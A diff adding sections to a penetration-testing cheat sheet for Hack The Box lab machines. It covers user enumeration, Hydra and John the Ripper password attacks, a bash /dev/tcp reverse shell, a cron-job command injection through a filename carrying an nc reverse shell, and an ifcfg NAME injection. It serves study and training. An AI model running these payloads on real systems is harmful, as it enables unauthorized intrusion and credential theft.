@@ -17,23 +17,36 @@
 - [Port Enumeration](#port-enumeration)
 	- [Port 53 - DNS](#port-53---dns)
 	- [Port 139 & 445 - SMB](#port-139--445---smb)
+	- [Port 79 - Finger Service](#port-79---finger-service)
 - [Login Brute Forcing](#login-brute-forcing)
+	- [Hydra](#hydra)
+	- [John the Ripper](#john-the-ripper)
 - [Reverse Shells](#reverse-shells)
 	- [Upgrading Shells](#upgrading-shells)
+	- [BASH reverse shells](#bash-reverse-shells)
+	- [BASH shell](#bash-shell)
 - [Privilege Escalation](#privilege-escalation)
 	- [Linux](#linux)
 		- [sudo -l](#sudo--l)
 		- [LinEnum](#linenum)
 			- [Crontab](#crontab)
 		- [pspy](#pspy)
+		- [Cron Jobs](#cron-jobs)
+		- [Chaining Vulns](#chaining-vulns)
 - [File Transfer](#file-transfer)
 - [Other Vulnerabilities](#other-vulnerabilities)
 	- [ShellShock](#shellshock)
 	- [Hijack Module/File Used by Script](#hijack-modulefile-used-by-script)
 	- [Stenography Challenge](#stenography-challenge)
 	- [SUID - SystemCtl](#suid---systemctl)
+	- [NAME Configuration Parameter Command Injection](#name-configuration-parameter-command-injection)
+	- [Magento](#magento)
 - [Miscellaneous](#miscellaneous)
 	- [Python SSL Issue](#python-ssl-issue)
+	- [Decompress TAR files](#decompress-tar-files)
+- [Other things to learn](#other-things-to-learn)
+- [Review the following HTB writeups](#review-the-following-htb-writeups)
+	- [Linux](#linux-1)
 
 <!-- /MarkdownTOC -->
 
@@ -59,6 +72,11 @@ nmap -sC -sV -O -oA nmap/initial <IP>
 ```
 nmap -sC -sV -O -p1–65535 -oA nmap/full <IP>
 ```
+
+```
+nmap -sC -sV -O -p- -oA htb/nibbles/nmap/full 10.10.10.75
+```
+
 
 * UDP scan:
 
@@ -149,6 +167,16 @@ host -l <domain-name> <dns_server-address>
 * Link - https://github.com/21y4d/nmapAutomator
 
 
+* Run the nmapAutomator script to enumerate open ports and services running on those ports.
+
+
+```
+./nmapAutomator.sh 10.10.10.146 All
+```
+
+* All: Runs all the scans consecutively.
+
+
 <br><br>
 
 
@@ -168,6 +196,11 @@ gobuster dir -t 10 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.t
 ```
 ffuf -w /opt/useful/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://SERVER_IP:PORT/FUZZ
 ```
+
+<br>
+
+* Don't forget to enumerate file extensions and virtual hosts/subdomains.
+
 
 <br>
 
@@ -222,15 +255,52 @@ smbclient //<IP>/general -N
 get creds.txt
 ```
 
+<br>
+
+#### Port 79 - Finger Service
+
+* Port 79: running Sun Solaris fingerd
+
+* Check if the user root exists:
+
+```
+root@kali:~# finger root@10.10.10.76
+```
+
+* http://pentestmonkey.net/tools/user-enumeration/finger-user-enum
+
+```
+./finger-user-enum.pl -U /usr/share/seclists/Usernames/Names/names.txt -t 10.10.10.76
+```
+
+
 
 <br><br>
 
 ### Login Brute Forcing
 
+#### Hydra
+
 * Hydra command to brute force password:
 
 ```
 hydra -l 'admin' -P /usr/share/john/password.lst admin.cronos.htb http-post-form "/:username=^USER^&password=^PASS^&Login=Login:Your Login Name or Password is invalid"
+```
+
+<br>
+
+```
+hydra -l sunny -P '/usr/share/wordlists/rockyou.txt' 10.10.10.76 ssh -s 22022
+```
+
+<br>
+
+#### John the Ripper
+
+* The sammy-hash.txt file contains a hash found from the /etc/shadow file
+
+```
+john --wordlist=/usr/share/wordlists/rockyou.txt sammy-hash.txt
 ```
 
 
@@ -280,6 +350,22 @@ stty raw -echo
 export TERM=xterm
 ```
 
+#### BASH reverse shells
+
+```
+bash -c 'bash -i >& /dev/tcp/10.10.14.12/1234 0>&1'
+```
+
+<br>
+
+#### BASH shell
+
+* We can get an easy shell if we can control a .sh file for example that is owned by root, add the following code in the file and execute it:
+
+```
+#!/bin/sh
+bash
+```
 
 <br><br>
 
@@ -334,6 +420,39 @@ sudo -i -u <user name>
 
 
  * Link - https://github.com/DominicBreuker/pspy
+
+
+<br>
+
+##### Cron Jobs
+
+```
+bash-4.2$ cat crontab.guly 
+*/3 * * * * php /home/guly/check_attack.php
+```
+
+* It’s running the file check_attack.php script every 3 minutes. If you’re not familiar with the crontab format, refer to the following link.
+
+* In this example, the file contained code vulnerable to a command injection vulnerability, the code was grabbing the file name under the /uploads directory and using it directly in a dynamic command function:
+
+* Exploit:
+
+* Change to the /var/www/html/uploads directory and create the following file.
+
+```
+touch '; nc -c bash 10.10.14.12 3333'
+```
+
+* Wait for the cronjob to run and get a shell (set up listener)
+
+
+<br>
+
+##### Chaining Vulns
+
+* The following link under the privilege escalation section, demonstrates a way to chain 2 vulnerabilities to gain access to a root shell:
+
+* https://github.com/rkhal101/Hack-the-Box-OSCP-Preparation/blob/master/linux-boxes/sunday-writeup-w-o-metasploit.md
 
 
 <br><br>
@@ -398,6 +517,42 @@ steghide extract -sf <JPG Image File Name>
 * Link - https://medium.com/@klockw3rk/privilege-escalation-leveraging-misconfigured-systemctl-permissions-bc62b0b28d49
 
 
+<br>
+
+#### NAME Configuration Parameter Command Injection
+
+* https://bugzilla.redhat.com/show_bug.cgi?id=1697473
+
+* There is a space in the NAME parameter:
+
+```
+DEVICE=guly0
+ONBOOT=no
+NM_CONTROLLED=no
+NAME=ps /tmp/foo
+PROXY_METHOD=asodih
+BROWSER_ONLY=asdoih
+BOOTPROTO=asdoih
+```
+
+* Exploit:
+
+```
+Run the sh script and when prompted to enter the NAME value enter:
+
+random bash
+```
+
+<br>
+
+
+#### Magento
+
+* https://github.com/steverobbins/magescan
+
+```
+php magescan.phar -vvv scan:all 10.10.10.140 > output
+```
 
 <br><br>
 
@@ -411,5 +566,37 @@ steghide extract -sf <JPG Image File Name>
 
 * If there is an issue with "SSL unsupported protocol error" when running a python script, this write up contains a work around - https://github.com/rkhal101/Hack-the-Box-OSCP-Preparation/blob/master/linux-boxes/beep-writeup-w-o-metasploit.md
 
+
+<br>
+
+#### Decompress TAR files
+
+```
+tar -C backup/ -xvf backup.tar
+```
+
+
+<br><br>
+
+### Other things to learn
+
+* Learn PHP.  Most of the scripts encountered in machines are in PHP from what I seen.
+
+
+
+<br><br>
+
+
+### Review the following HTB writeups
+
+#### Linux
+
+* https://github.com/rkhal101/Hack-the-Box-OSCP-Preparation/blob/master/linux-boxes/swagshop-writeup-w-o-metasploit.md
+
+* https://github.com/rkhal101/Hack-the-Box-OSCP-Preparation/blob/master/linux-boxes/tabby-writeup-w-o-metasploit.md
+
+* https://github.com/rkhal101/Hack-the-Box-OSCP-Preparation/blob/master/linux-boxes/valentine-writeup-w-o-metasploit.md
+
+<br>
 
 
